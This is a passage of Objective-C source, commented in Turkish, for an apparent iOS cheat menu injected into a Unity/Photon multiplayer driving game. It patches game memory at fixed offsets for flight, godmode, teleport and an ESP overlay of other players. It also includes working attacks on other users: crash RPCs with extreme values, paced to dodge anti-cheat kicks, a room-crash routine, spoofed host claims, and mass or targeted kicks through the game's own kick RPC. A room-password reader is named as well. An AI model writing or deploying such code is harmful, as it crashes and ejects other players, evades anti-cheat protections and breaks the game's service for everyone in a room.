        [self.moneyBtn setTitle:[NSString stringWithFormat:@"\U0001F4B5 %@ Ekle | Bakiye:%ld", [self shortNum:customMoneyAmount], m] forState:UIControlStateNormal];
    else
        [self.moneyBtn setTitle:[NSString stringWithFormat:@"\U0001F4B5 %@ Para Ekle", [self shortNum:customMoneyAmount]] forState:UIControlStateNormal];
    [self.moneyBtn setTitleColor:C_GOLD forState:UIControlStateNormal];

    if (isCustomPlateEnabled)
        [self.plateBtn setTitle:[NSString stringWithFormat:@"\U0001F4DD Plaka: %s ✅", customPlateText] forState:UIControlStateNormal];
    else
        [self.plateBtn setTitle:@"\U0001F4DD Ozel Plaka Ayarla" forState:UIControlStateNormal];
    [self.plateBtn setTitleColor:isCustomPlateEnabled ? C_ON : C_GOLD forState:UIControlStateNormal];
}

- (void)frameTick {
    enforceScale();          // her ekran frame'inde timeScale'i zorla
    // ===== OTOMATIK KARSILAMA: odaya YENI girince (false->true kenari) mesaj at =====
    // Optimizasyon: sadece ozellik ACIKKEN poll et (kapaliyken her frame cagri yok)
    if (isAutoGreetEnabled && pn_getInRoom) {
        bool inRoom = false;
        @try { inRoom = pn_getInRoom(); } @catch (...) {}
        if (inRoom && !g_wasInRoom && chatGetInst && chatSend) {
            NSString *greet = [NSString stringWithUTF8String:g_greetText];
            // chat hazir olsun diye 1.5sn sonra gonder
            dispatch_after(dispatch_time(DISPATCH_TIME_NOW, (int64_t)(1.5 * NSEC_PER_SEC)), dispatch_get_main_queue(), ^{
                @try { void* mgr = chatGetInst(); void* s = mkStr(greet); if (mgr && s && greet.length > 0) chatSend(mgr, s); } @catch (...) {}
            });
        }
        g_wasInRoom = inRoom;
    }
    few1n_applyCar();        // onbellekten nitro/hiz/panel uygula (arama YAPMAZ - ucuz)
    few1n_applyColor();      // arac rengini uygula (onbellek materyaller - ucuz)
    few1n_applyGodmode();    // godmode: canCrash=false (hic kaza yapma)
    few1n_applySelektor();   // selektor: RCCP high/low beam hizli cakma
    few1n_applyAlwaysLights(); // v97: Farlar Surekli Acik (offset 0x40/0x41)
    // ===== UCUS: havada GERCEK surus (gaz=ileri, fren=geri, direksiyon=don) - PURUZSUZ =====
    // Hepsi hiz/acisal-hiz (fizik) ile -> Photon dogal senkronlar -> baskalarinda titremez.
    if (isFlyEnabled && !isFlyPadShown && unityAlive(g_rb)) {
        @try {
            Vec3 v = {0,0,0}; rbGetVelIl(g_rb, &v);
            Vec3 fwd; bool haveFwd = few1n_fwd(g_rb, &fwd);
            float thr = 0.0f, brk = 0.0f, str = 0.0f;
            if (unityAlive(g_myRccp)) {
                thr = *(float*)((uintptr_t)g_myRccp + 0x168);   // throttleInput_V
                brk = *(float*)((uintptr_t)g_myRccp + 0x16C);   // brakeInput_V (geri)
                str = *(float*)((uintptr_t)g_myRccp + 0x170);   // steerInput_V
            }
            float drive = thr - brk;   // gaz ileri, fren geri (-1..1)
            // OTOMATIK GAZ: fren basili degilse otomatik ileri git -> parmak sadece direksiyonda
            if (flyAutoThrust && brk < 0.05f) drive = fmaxf(drive, flyAutoLevel);
            if (haveFwd && fabsf(drive) > 0.05f) {
                float tx = fwd.x * drive * flyDriveSpeed, tz = fwd.z * drive * flyDriveSpeed;
                v.x += (tx - v.x) * 0.35f;   // yumusak gecis (ani degil -> titremez)
                v.z += (tz - v.z) * 0.35f;
                v.y *= 0.80f;                // surerken dikey yumusak asili kal
            } else {
                // DURURKEN tam sifir hiz -> HR_PhotonSync uzak kopyada hareket/dusme tahmin etmez -> en az titreme
                v.x = 0.0f; v.z = 0.0f; v.y = 0.0f;
            }
            rbSetVelIl(g_rb, &v);
            Vec3 av = {0.0f, str * 2.2f, 0.0f};   // direksiyon -> yaw donme (fizik, puruzsuz)
            rbSetAngVelIl(g_rb, &av);
        } @catch (...) {}
    } else if ((isLowGravEnabled || isNoClip || isAntiGrav) && unityAlive(g_rb)) {
        @try {
            Vec3 v = {0,0,0}; rbGetVelIl(g_rb, &v);
            if (isNoClip || isAntiGrav) v.y *= 0.80f;              // no-clip/anti-grav: yumusak asili kal (titremez)
            else if (isLowGravEnabled && v.y < 0.0f) v.y *= 0.25f; // floaty dusus
            rbSetVelIl(g_rb, &v);
        } @catch (...) {}
    }

    // ===== UCUS D-PAD: ekran butonlariyla ucus (g_myRccp GEREKMEZ - carDrive=YOK olsa bile calisir) =====
    if (isFlyPadShown && unityAlive(g_rb)) {
        @try {
            Vec3 v = {0,0,0}; rbGetVelIl(g_rb, &v);
            Vec3 fwd; bool hf = few1n_fwd(g_rb, &fwd);
            float sp = flyDriveSpeed;
            float tx = 0.0f, tz = 0.0f;
            if (hf) {
                if (g_dpFwd)  { tx += fwd.x * sp; tz += fwd.z * sp; }
                if (g_dpBack) { tx -= fwd.x * sp; tz -= fwd.z * sp; }
            }
            v.x += (tx - v.x) * 0.35f;   // yumusak gecis -> titremez
            v.z += (tz - v.z) * 0.35f;
            if (g_dpUp)        v.y = 12.0f;
            else if (g_dpDown) v.y = -12.0f;
            else               v.y = 0.0f;   // tus yoksa havada asili kal
            rbSetVelIl(g_rb, &v);
            float yaw = (g_dpLeft ? -2.4f : 0.0f) + (g_dpRight ? 2.4f : 0.0f);
            Vec3 av = {0.0f, yaw, 0.0f};     // sag/sol -> yaw don
            rbSetAngVelIl(g_rb, &av);
        } @catch (...) {}
    }

    // ===== OTOMATIK HAVALI KORNA SPAM =====
    if (isAutoHornEnabled && unityAlive(g_rb)) {
        static int hornTick = 0;
        hornTick++;
        @try {
            if (g_myRccp) {
                bool hornState = (hornTick % 10 < 5);  // 100ms ritmik cal
                *(bool*)((uintptr_t)g_myRccp + 0x1A0) = hornState; // indicatorsAllLights / Horn signal
            }
        } @catch (...) {}
    }

    // ===== POP & BANGS (EGZOZ ALEV & PATLAMA EFEKTI) =====
    if (isPopBangsEnabled && unityAlive(g_rb) && g_myRccp) {
        @try {
            float rpm = *(float*)((uintptr_t)g_myRccp + 0x114); // engineRPM
            if (rpm > 3500.0f) {
                static int pTick = 0; pTick++;
                if (pTick % 4 == 0) {
                    *(bool*)((uintptr_t)g_myRccp + 0x19C) = true;  // lowBeam
                    *(bool*)((uintptr_t)g_myRccp + 0x19D) = true;  // highBeam
                } else if (pTick % 4 == 2) {
                    *(bool*)((uintptr_t)g_myRccp + 0x19C) = false;
                    *(bool*)((uintptr_t)g_myRccp + 0x19D) = false;
                }
            }
        } @catch (...) {}
    }

    // ===== YUKSEK DEVIR / KESICI SES MODU (ONLINE SYNC) =====
    if (isRevLimiterEnabled && unityAlive(g_rb) && g_myRccp) {
        @try {
            static int rTick = 0; rTick++;
            float maxRpm = *(float*)((uintptr_t)g_myRccp + 0x11C); // maxEngineRPM
            if (maxRpm < 6000.0f) maxRpm = 9000.0f;
            float targetRpm = (rTick % 6 < 3) ? maxRpm : (maxRpm * 0.88f);
            *(float*)((uintptr_t)g_myRccp + 0x114) = targetRpm; // engineRPM -> Online oyunculara kesici sesi gider
        } @catch (...) {}
    }
    if (isCruiseEnabled && unityAlive(g_rb)) {
        @try {
            Vec3 fwd;
            if (few1n_fwd(g_rb, &fwd)) {
                float targetMps = cruiseSpeedKmh / 3.6f;   // km/h -> m/s cevir
                Vec3 v = {0,0,0}; rbGetVelIl(g_rb, &v);
                v.x = fwd.x * targetMps;
                v.z = fwd.z * targetMps;
                rbSetVelIl(g_rb, &v);
            }
        } @catch (...) {}
    }

    // ===== NAN / EXPLOIT CRASH (Rate limited & Valid Extreme Float -> No Anti-Cheat kick) =====
    static int nanTickCnt = 0;
    if (isNanCrashEnabled && unityAlive(g_rb) && g_carPhotonSyncTypeObj && g_mGetCompInParent && i_runtime_invoke && cps_TeleportCar_RPC) {
        if (++nanTickCnt % 25 == 0) { // 0.4 sn aralikla (socket/rate-limit kick'i engeller)
            @try {
                Vec3 savedPos = {0,0,0};
                Vec3 savedVel = {0,0,0};
                rbGetPosIl(g_rb, &savedPos);
                rbGetVelIl(g_rb, &savedVel);
                void* args[2]; args[0] = g_carPhotonSyncTypeObj; bool inc = true; args[1] = &inc;
                void* cps = i_runtime_invoke(g_mGetCompInParent, g_rb, args, NULL);
                if (ptrOk(cps)) {
                    Vec3 crashV = {9999999.0f, 9999999.0f, 9999999.0f};
                    Quaternion crashQ = {99999.0f, 99999.0f, 99999.0f, 99999.0f};
                    cps_TeleportCar_RPC(cps, crashV, crashQ, NULL);
                }
                rbSetPosIl(g_rb, &savedPos);
                rbSetVelIl(g_rb, &savedVel);
                Vec3 zeroAng = {0,0,0};
                rbSetAngVelIl(g_rb, &zeroAng);
            } @catch (...) {}
        }
    }
    // ===== PANIC ANINDA COKERT =====
    if (panicCrash) {
        panicCrash = false;
        // NaN RPC'leri gonder (kendi arabani koruyarak)
        [self fireNanCrashRemote];
        // Oda cokertme (onaysiz, hizli)
        [self fireRoomCrash];
    }

    // ===== DRIFT MODU (STABIL - il2cpp) araba UCMAZ, hizlanmaz =====
    if (isDriftEnabled && unityAlive(g_rb)) {
        @try {
            Vec3 v = {0,0,0}; rbGetVelIl(g_rb, &v);
            // 1) Dikey hizi TAMAMEN kes -> asla yukari firlamaz (ucmaz)
            if (v.y > 0.0f) v.y = 0.0f;
            // 2) Yatay hizi ASLA arttirma; sadece asiri hizi (>70 m/s) sinirla -> runaway yok
            float horiz = sqrtf(v.x*v.x + v.z*v.z);
            if (horiz > 70.0f) { float k = 70.0f / horiz; v.x *= k; v.z *= k; }
            rbSetVelIl(g_rb, &v);
        } @catch (...) {}
    }
}

- (void)jumpTap {
    FLog(unityAlive(g_rb) ? @"ZIPLA: rb VAR, uygulaniyor" : @"ZIPLA: rb YOK (mod arabayi henuz bulamadi)");
    if (unityAlive(g_rb)) {
        @try {
            Vec3 v = {0,0,0};
            rbGetVelIl(g_rb, &v);
            v.y = 14.0f;                          // yukari itme (zipla)
            rbSetVelIl(g_rb, &v);
        } @catch (NSException *e) { FLog([@"ZIPLA hata: " stringByAppendingString:e.reason ?: @"?"]); }
    }
}

// ===== YENI: HIZ PATLAMASI (anlik) - yatay hizi 2.5x it =====
- (void)boostTap {
    if (!unityAlive(g_rb)) { FLog(@"Boost: araba araniyor (birkac saniye bekle)"); return; }
    @try {
        Vec3 v = {0,0,0};
        rbGetVelIl(g_rb, &v);
        float horiz = sqrtf(v.x*v.x + v.z*v.z);
        if (horiz < 1.0f) { v.x = 0; v.z = 40.0f; }   // duruyorsa ileri firlat
        else { v.x *= 2.5f; v.z *= 2.5f; }
        rbSetVelIl(g_rb, &v);
        FLog(@"Hiz patlamasi uygulandi");
    } @catch (...) { FLog(@"Boost hatasi"); }
}

// ===== YENI: ARACI DONDUR - hizi sifirla (anlik dur) =====
- (void)freezeTap {
    if (!unityAlive(g_rb)) { FLog(@"Dondur: araba araniyor (birkac saniye bekle)"); return; }
    @try {
        Vec3 z = {0,0,0};
        rbSetVelIl(g_rb, &z);
        FLog(@"Arac donduruldu (hiz=0)");
    } @catch (...) { FLog(@"Dondur hatasi"); }
}

// ===== YENI: ESP - diger oyuncularin ekranda mesafesi/kutusu =====
- (void)tapESP {
    isEspEnabled = !isEspEnabled;
    saveBool(@"esp", isEspEnabled);
    if (isEspEnabled && (!g_mWorldToScreen || !g_mFindObjectsPlural)) { FLog(@"ESP: Camera/bulucu hazir degil"); isEspEnabled = false; }
    [self syncDrawOverlay];
    [self refreshUI];
}
// ESP acikken cizim overlay'i + timer'i yonet
- (void)syncDrawOverlay {
    BOOL need = isEspEnabled;
    if (need) {
        UIWindow *w = getKeyWindow();
        if (w && !self.espOverlay) {
            FEW1NDrawView *dv = [[FEW1NDrawView alloc] initWithFrame:w.bounds];
            dv.userInteractionEnabled = NO;
            dv.backgroundColor = [UIColor clearColor];
            dv.opaque = NO;
            [w addSubview:dv];
            self.espOverlay = dv;
        }
        if (!self.espTimer) self.espTimer = [NSTimer scheduledTimerWithTimeInterval:0.10 target:self selector:@selector(updateESP) userInfo:nil repeats:YES];
        FLog(@"Overlay acildi (ESP/HUD)");
    } else {
        if (self.espTimer) { [self.espTimer invalidate]; self.espTimer = nil; }
        if (self.espOverlay) { [self.espOverlay removeFromSuperview]; self.espOverlay = nil; }
        g_espCount = 0;
    }
}

- (void)updateESP {
    if (!self.espOverlay) return;
    @try {
        UIWindow *w = getKeyWindow();
        if (w) self.espOverlay.frame = w.bounds;
        [w bringSubviewToFront:self.espOverlay];

        g_espCount = 0;
        if (isEspEnabled) {
            void* cam = few1n_getCamera();
            int cnt = 0;
            void* arr = ptrOk(cam) ? few1n_findAllCars(&cnt) : NULL;
            if (arr && cnt > 0) {
                void** cars = (void**)((uintptr_t)arr + 0x20);
                CGFloat scale = [UIScreen mainScreen].scale;
                CGFloat viewH = self.espOverlay.bounds.size.height;
                CGFloat viewW = self.espOverlay.bounds.size.width;
                Vec3 myPos = {0,0,0};
                BOOL haveMe = unityAlive(g_rb); if (haveMe) rbGetPosIl(g_rb, &myPos);
                for (int i = 0; i < cnt && g_espCount < 128; i++) {
                    void* car = cars[i];
                    if (!unityAlive(car)) continue;
                    void* rb = *(void**)((uintptr_t)car + 0x48);
                    if (!unityAlive(rb) || rb == g_rb) continue;
                    Vec3 wp = {0,0,0}; rbGetPosIl(rb, &wp);
                    Vec3 sp = {0,0,0};
                    if (!few1n_worldToScreen(cam, wp, &sp) || sp.z <= 0.0f) continue;
                    CGFloat sx = sp.x / scale;
                    CGFloat sy = viewH - (sp.y / scale);
                    if (sx < -60 || sx > viewW+60 || sy < -60 || sy > viewH+60) continue;
                    // kutu yuksekligi: aracin ustunu de projekte et (2.2m yukari)
                    Vec3 wpTop = { wp.x, wp.y + 2.2f, wp.z };
                    Vec3 spTop = {0,0,0};
                    CGFloat boxH = 40;
                    if (few1n_worldToScreen(cam, wpTop, &spTop) && spTop.z > 0) {
                        CGFloat syTop = viewH - (spTop.y / scale);
                        boxH = fabs(sy - syTop); if (boxH < 14) boxH = 14; if (boxH > 220) boxH = 220;
                    }
                    float dist = 0;
                    if (haveMe) { float dx=wp.x-myPos.x, dy=wp.y-myPos.y, dz=wp.z-myPos.z; dist = sqrtf(dx*dx+dy*dy+dz*dz); }
                    g_espItems[g_espCount++] = (EspItem){ (float)sx, (float)sy, dist, (float)boxH };
                }
            }
        }
        [self.espOverlay setNeedsDisplay];   // kutu/cizgi/HUD yeniden ciz
    } @catch (...) {}
}

// ===== ISINLANMA (kendi araban - Rigidbody.position) =====
- (void)saveTeleportPos {
    if (unityAlive(g_rb)) {
        @try {
            rbGetPosIl(g_rb, &g_savedPos);
            g_hasSavedPos = true;
            FLog([NSString stringWithFormat:@"Konum kaydedildi: %.1f, %.1f, %.1f", g_savedPos.x, g_savedPos.y, g_savedPos.z]);
        } @catch (...) {}
    }
}
- (void)teleportSaved {
    if (unityAlive(g_rb) && g_hasSavedPos) {
        @try {
            Vec3 p = g_savedPos;
            rbSetPosIl(g_rb, &p);
            Vec3 z = {0,0,0}; rbSetVelIl(g_rb, &z);   // hizi sifirla
        } @catch (...) {}
    }
}
- (void)teleportForward {
    if (unityAlive(g_rb)) {
        @try {
            Vec3 p = {0,0,0};
            rbGetPosIl(g_rb, &p);
            p.z += 50.0f;   // 50 birim ileri (harita eksenine gore)
            p.y += 3.0f;
            rbSetPosIl(g_rb, &p);
        } @catch (...) {}
    }
}
- (void)teleportUp {
    if (unityAlive(g_rb)) {
        @try {
            Vec3 p = {0,0,0};
            rbGetPosIl(g_rb, &p);
            p.y += 30.0f;   // 30 birim yukari (takildiginda kurtul)
            rbSetPosIl(g_rb, &p);
        } @catch (...) {}
    }
}

// ===== SIFRE KIRICI: odalarin sifresini oku ve goster (il2cpp) =====
// HR_UI_RoomListLine: +0x50 password, +0x58 roomInfo -> rinfo_getName
// ===== MASS KICK: odadaki tum DIGER oyunculari at (SADECE MASTER/host isen calisir) =====
- (void)kickAllPlayers {
    UIAlertController *ac = [UIAlertController alertControllerWithTitle:@"⚔️ Tum Oyunculari At?"
        message:@"SADECE kendi odanda (host/master) calisir. Baskasinin odasinda Photon sunucusu yok sayar." preferredStyle:UIAlertControllerStyleAlert];
    [ac addAction:[UIAlertAction actionWithTitle:@"Evet, At" style:UIAlertActionStyleDestructive handler:^(UIAlertAction *a2){
        if (!pn_getPlayerListOthers) { FLog(@"PlayerListOthers pointeri yok"); return; }
        @try {
            void* pa = pn_getPlayerListOthers();   // kendisi HARIC diger oyuncular
            if (!ptrOk(pa)) { FLog(@"Odada baska oyuncu yok"); return; }
            int cnt = (int)(*(uintptr_t*)((uintptr_t)pa + 0x18));
            if (cnt <= 0 || cnt > 64) { FLog([NSString stringWithFormat:@"Oyuncu sayisi anormal (%d)", cnt]); return; }
            void** ps = (void**)((uintptr_t)pa + 0x20);
            int kicked = 0;
            for (int i = 0; i < cnt; i++) {
                void* p = ps[i]; if (!ptrOk(p)) continue;
                few1n_kickPlayer(p); kicked++;
            }
            FLog([NSString stringWithFormat:@"%d oyuncuya kick gonderildi (master isen dustuler, degilsen sunucu yok saydi)", kicked]);
        } @catch (...) { FLog(@"Mass kick hatasi"); }
    }]];
    [ac addAction:[UIAlertAction actionWithTitle:@"Iptal" style:UIAlertActionStyleCancel handler:nil]];
    [self present:ac];
}

// ===== GERCEK KICK: oyunun KENDI KickPlayerRPC'si (disassemble ile dogrulandi) =====
// LobbyDummy.KickPlayer() -> this+0x108 (ipg) hedef nickname'i okur -> photonView.RPC("KickPlayerRPC", All, isim)
// KickPlayerRPC her clientte: gelen isim == kendi nickname ise LeaveRoom() -> GERCEKTEN duser (clientlar kendi kodu).
- (void)nativeKickAll {
    if (!g_lobbyDummyType || !g_mFindObjectsPlural || !i_runtime_invoke || !g_mDummyKick || !pn_getPlayerListOthers) {
        FLog(@"Gercek kick hazir degil - oda/lobi ekraninda dene"); return;
    }
    UIAlertController *ac = [UIAlertController alertControllerWithTitle:@"🔨 GERCEK Kick (oyunun RPC'si)"
        message:@"Oyunun kendi KickPlayerRPC'sini kullanir -> tum clientlar dinler, GERCEKTEN duser. Kendi odandaki tum digerlerini at?" preferredStyle:UIAlertControllerStyleAlert];
    [ac addAction:[UIAlertAction actionWithTitle:@"Evet, At" style:UIAlertActionStyleDestructive handler:^(UIAlertAction *a2){
        @try {
            // 1) PhotonView'i OLAN dogru lobi yoneticisi instance'i
            void* mgr = few1n_findLobbyMgr();
            if (!unityAlive(mgr)) { FLog(@"Lobi yoneticisi yok/photonView'siz (oda/bekleme ekraninda dene)"); return; }
            // 2) Odadaki DIGER oyuncularin nickname'lerini al, her birini at
            void* pa = pn_getPlayerListOthers();
            if (!ptrOk(pa)) { FLog(@"Odada baska oyuncu yok"); return; }
            int cnt = (int)(*(uintptr_t*)((uintptr_t)pa + 0x18));
            if (cnt <= 0 || cnt > 64) { FLog(@"Baska oyuncu yok"); return; }
            void** ps = (void**)((uintptr_t)pa + 0x20);
            int k = 0;
            for (int i = 0; i < cnt; i++) {
                void* p = ps[i]; if (!ptrOk(p)) continue;
                void* nmeStr = ply_getNickName ? ply_getNickName(p) : NULL;
                if (!ptrOk(nmeStr)) continue;
                *(void**)((uintptr_t)mgr + 0x108) = nmeStr;   // hedef ismi ipg (+0x108) alanina yaz
                void* exc = NULL;
                @try { i_runtime_invoke(g_mDummyKick, mgr, NULL, &exc); k++; } @catch (...) {}
            }
            FLog([NSString stringWithFormat:@"%d oyuncuya KickPlayerRPC gonderildi -> GERCEKTEN dusmeli (oyunun kendi kick'i)", k]);
        } @catch (...) { FLog(@"Gercek kick hatasi"); }
    }]];
    [ac addAction:[UIAlertAction actionWithTitle:@"Iptal" style:UIAlertActionStyleCancel handler:nil]];
    [self present:ac];
}
// Tek oyuncuyu ismiyle at (oyunun KickPlayerRPC'si)
- (void)nativeKickByName {
    if (!g_lobbyDummyType || !g_mFindObjectsPlural || !i_runtime_invoke || !g_mDummyKick) { FLog(@"Gercek kick hazir degil - oda/lobi ekraninda dene"); return; }
    UIAlertController *ac = [UIAlertController alertControllerWithTitle:@"🔨 Oyuncuyu At (isimle)"
        message:@"Atmak istedigin oyuncunun TAM nickname'ini yaz:" preferredStyle:UIAlertControllerStyleAlert];
    [ac addTextFieldWithConfigurationHandler:^(UITextField *tf){ tf.placeholder = @"nickname"; tf.clearButtonMode = UITextFieldViewModeAlways; }];
    [ac addAction:[UIAlertAction actionWithTitle:@"At" style:UIAlertActionStyleDestructive handler:^(UIAlertAction *a2){
        NSString *nm = ac.textFields.firstObject.text;
        if (!nm || nm.length == 0) { FLog(@"Bos isim"); return; }
        @try {
            void* a[1]; a[0] = g_lobbyDummyType;
            void* larr = i_runtime_invoke(g_mFindObjectsPlural, NULL, a, NULL);
            if (!ptrOk(larr)) { FLog(@"Lobi yoneticisi yok"); return; }
            int lc = (int)(*(uintptr_t*)((uintptr_t)larr + 0x18));
            if (lc <= 0) { FLog(@"Lobi yoneticisi bulunamadi"); return; }
            void* mgr = ((void**)((uintptr_t)larr + 0x20))[0];
            if (!unityAlive(mgr)) { FLog(@"Lobi instance gecersiz"); return; }
            void* ns = mkStr(nm);
            if (!ns) return;
            *(void**)((uintptr_t)mgr + 0x108) = ns;
            @try { i_runtime_invoke(g_mDummyKick, mgr, NULL, NULL); } @catch (...) {}
            FLog([NSString stringWithFormat:@"'%@' icin KickPlayerRPC gonderildi -> dusmeli", nm]);
        } @catch (...) { FLog(@"Gercek kick hatasi"); }
    }]];
    [ac addAction:[UIAlertAction actionWithTitle:@"Iptal" style:UIAlertActionStyleCancel handler:nil]];
    [self present:ac];
}
// Ortak kick helper: verilen nickname'i lobi yoneticisine yazip KickPlayerRPC gonderir
- (BOOL)doNativeKick:(NSString*)nm {
    if (!i_runtime_invoke || !g_mDummyKick || nm.length == 0) return NO;
    void* mgr = few1n_findLobbyMgr();   // PhotonView'i OLAN dogru instance
    if (!unityAlive(mgr)) { FLog(@"Lobi yoneticisi yok/photonView'siz - oda/bekleme ekraninda dene"); return NO; }
    @try {
        void* ns = mkStr(nm);
        if (!ns) return NO;
        *(void**)((uintptr_t)mgr + 0x108) = ns;   // hedef ismi ipg (+0x108)
        // KickPlayer icinde RPC panel erisiminden ONCE gider; panel null olsa bile
        // olusan exception'i exc'ye yakalariz (crash yok, RPC yine de gitmis olur).
        void* exc = NULL;
        i_runtime_invoke(g_mDummyKick, mgr, NULL, &exc);
        return YES;
    } @catch (...) { return NO; }
}
// Odadaki oyuncularu LISTELE, secilen(ler)i at
// v91: SIFIRDAN YAZILMIS KICK — Master ol → 3 kick metodunu sirayla dene → tuttugun kadar guclu
- (void)nativeKickPick {
    if (!pn_getInRoom || !pn_getInRoom()) {
        UIAlertController *e = [UIAlertController alertControllerWithTitle:@"🎯 Kick" message:@"Odada olmalisin." preferredStyle:UIAlertControllerStyleAlert];
        [e addAction:[UIAlertAction actionWithTitle:@"Tamam" style:UIAlertActionStyleDefault handler:nil]];
        [self present:e]; return;
    }
    if (!ply_getNickName) {
        UIAlertController *e = [UIAlertController alertControllerWithTitle:@"🎯 Kick" message:@"ply_getNickName NULL - Photon pointer hazir degil" preferredStyle:UIAlertControllerStyleAlert];
        [e addAction:[UIAlertAction actionWithTitle:@"Tamam" style:UIAlertActionStyleDefault handler:nil]];
        [self present:e]; return;
    }
    @try {
        // v107: pn_getPlayerListOthers NULL olabilir - fallback: pn_getPlayerList + self filter
        void* pa = NULL;
        if (pn_getPlayerListOthers) pa = pn_getPlayerListOthers();
        BOOL useAllList = NO;
        if (!ptrOk(pa) && pn_getPlayerList) { pa = pn_getPlayerList(); useAllList = YES; }
        if (!ptrOk(pa)) {
            UIAlertController *e = [UIAlertController alertControllerWithTitle:@"🎯 Kick" message:@"Player list NULL - pn_getPlayerList/Others ikisi de basarisiz." preferredStyle:UIAlertControllerStyleAlert];
            [e addAction:[UIAlertAction actionWithTitle:@"Tamam" style:UIAlertActionStyleDefault handler:nil]];
            [self present:e]; return;
        }
        int cnt = (int)(*(uintptr_t*)((uintptr_t)pa + 0x18));
        if (cnt <= 0 || cnt > 64) {
            UIAlertController *e = [UIAlertController alertControllerWithTitle:@"🎯 Kick" message:[NSString stringWithFormat:@"Odada baska oyuncu yok. (cnt=%d)", cnt] preferredStyle:UIAlertControllerStyleAlert];
            [e addAction:[UIAlertAction actionWithTitle:@"Tamam" style:UIAlertActionStyleDefault handler:nil]];
            [self present:e]; return;
        }
        void** ps = (void**)((uintptr_t)pa + 0x20);
        void* me = (useAllList && pn_getLocalPlayer) ? pn_getLocalPlayer() : NULL;

        UIAlertController *ac = [UIAlertController alertControllerWithTitle:@"🎯 Kick — Oyuncu Sec"
            message:[NSString stringWithFormat:@"Odada %d baska oyuncu.\nSec → Master alinir + 3 kick metodu sirayla denenir:", cnt]
            preferredStyle:UIAlertControllerStyleActionSheet];

        for (int i = 0; i < cnt && i < 32; i++) {
            void* p = ps[i]; if (!ptrOk(p)) continue;
            if (me && p == me) continue;   // v107: kendisini skip et (useAllList mode)
            void* nsObj = ply_getNickName(p);
            NSString *nm = ptrOk(nsObj) ? (readStr(nsObj) ?: @"") : @"";
            if (nm.length == 0) nm = [NSString stringWithFormat:@"actor%d", i];
            NSString *nmClean = stripRichTextTags(nm) ?: nm;
            NSString *nmCopy = [nm copy];
            void* pTarget = p;   // pointer'i tut

            [ac addAction:[UIAlertAction actionWithTitle:[NSString stringWithFormat:@"🔨 %@", nmClean.length > 0 ? nmClean : nm]
                style:UIAlertActionStyleDestructive handler:^(UIAlertAction *a){
                FLog([NSString stringWithFormat:@"🎯 Kick basladi: '%@'", nmCopy]);

                // v97: MASTER GARANTI ZINCIRI - 3 kez dene, gerçekten oldun mu kontrol et
                __block int masterAttempts = 0;
                void (^tryClaimMaster)(void) = ^{
                    few1n_claimMaster();
                    masterAttempts++;
                    FLog([NSString stringWithFormat:@"👑 Master claim denemesi #%d", masterAttempts]);
                };
                tryClaimMaster();
                dispatch_after(dispatch_time(DISPATCH_TIME_NOW, (int64_t)(1.0 * NSEC_PER_SEC)), dispatch_get_main_queue(), ^{
                    BOOL amMaster = NO;
                    if (pn_getLocalPlayer && ply_getIsMaster) {
                        void* me = pn_getLocalPlayer();
                        if (me) amMaster = ply_getIsMaster(me);
                    }
                    if (!amMaster) { FLog(@"👑 Hala master degilim - 2. deneme"); tryClaimMaster(); }
                });
                dispatch_after(dispatch_time(DISPATCH_TIME_NOW, (int64_t)(2.0 * NSEC_PER_SEC)), dispatch_get_main_queue(), ^{
                    BOOL amMaster = NO;
                    if (pn_getLocalPlayer && ply_getIsMaster) {
                        void* me = pn_getLocalPlayer();
                        if (me) amMaster = ply_getIsMaster(me);
                    }
                    if (!amMaster) { FLog(@"👑 Hala master degilim - 3. deneme"); tryClaimMaster(); }
                });
                dispatch_after(dispatch_time(DISPATCH_TIME_NOW, (int64_t)(3.0 * NSEC_PER_SEC)), dispatch_get_main_queue(), ^{
                    BOOL amMaster = NO;
                    if (pn_getLocalPlayer && ply_getIsMaster) {
                        void* me = pn_getLocalPlayer();
                        if (me) amMaster = ply_getIsMaster(me);
                    }
                    FLog([NSString stringWithFormat:@"🎯 Kick baslamadan durum: master=%@ (denemeler=%d)", amMaster ? @"EVET" : @"HAYIR", masterAttempts]);
                    int successCount = 0;

                    // Metod A: Oyunun kendi KickPlayerRPC'si (LobbyDummy.KickPlayer)
                    @try {
                        void* mgr = few1n_findLobbyMgr();
                        if (unityAlive(mgr) && g_mDummyKick && i_runtime_invoke) {
                            void* nsStr = mkStr(nmCopy);
                            if (nsStr) {
                                *(void**)((uintptr_t)mgr + 0x108) = nsStr;
                                @try {
                                    i_runtime_invoke(g_mDummyKick, mgr, NULL, NULL);
                                    successCount++;
                                    FLog(@"  ✓ Metod A: LobbyDummy.KickPlayerRPC gonderildi");
                                } @catch (...) { FLog(@"  ✗ Metod A: RPC exception"); }
                            }
                        } else { FLog(@"  - Metod A: mgr veya g_mDummyKick NULL"); }
                    } @catch (...) { FLog(@"  ✗ Metod A: exception"); }

                    // Metod B: PhotonNetwork.CloseConnection(target)
                    @try {
                        if (pn_closeConnection && pTarget) {
                            few1n_forceEnableKick();   // EnableCloseConnection=true
                            if (pn_closeConnection(pTarget)) {
                                successCount++;
                                FLog(@"  ✓ Metod B: PhotonNetwork.CloseConnection tetiklendi");
                            } else {
                                FLog(@"  ✗ Metod B: CloseConnection false dondu (master degilsin?)");
                            }
                        } else { FLog(@"  - Metod B: pn_closeConnection NULL"); }
                    } @catch (...) { FLog(@"  ✗ Metod B: exception"); }

                    // Metod C: few1n_kickPlayer (mevcut kombine helper)
                    @try {
                        few1n_kickPlayer(pTarget);
                        successCount++;
                        FLog(@"  ✓ Metod C: few1n_kickPlayer helper");
                    } @catch (...) { FLog(@"  ✗ Metod C: exception"); }

                    FLog([NSString stringWithFormat:@"🎯 KICK BITTI '%@' → %d/3 metod tetiklendi", nmCopy, successCount]);

                    UIAlertController *r = [UIAlertController alertControllerWithTitle:@"🔨 Kick Gonderildi"
                        message:[NSString stringWithFormat:@"'%@'\n\n%d/3 metod tetiklendi.\n\nOyuncu dusmediyse:\n1) Sen MASTER olmayabilirsin — once 👑 Oda Master Ol butonu\n2) Hedef mod'lu client kullaniyor olabilir (kick reddeder)\n3) Baska bir odada dene", nmCopy, successCount]
                        preferredStyle:UIAlertControllerStyleAlert];
                    [r addAction:[UIAlertAction actionWithTitle:@"Tamam" style:UIAlertActionStyleDefault handler:nil]];
                    [self present:r];
                });
            }]];
        }
        [ac addAction:[UIAlertAction actionWithTitle:@"Iptal" style:UIAlertActionStyleCancel handler:nil]];
        if (ac.popoverPresentationController) {
            ac.popoverPresentationController.sourceView = self.panel;
            ac.popoverPresentationController.sourceRect = CGRectMake(self.panel.bounds.size.width/2, 80, 1, 1);
        }
        [self present:ac];
    } @catch (...) { FLog(@"Kick UI hatasi"); }
}

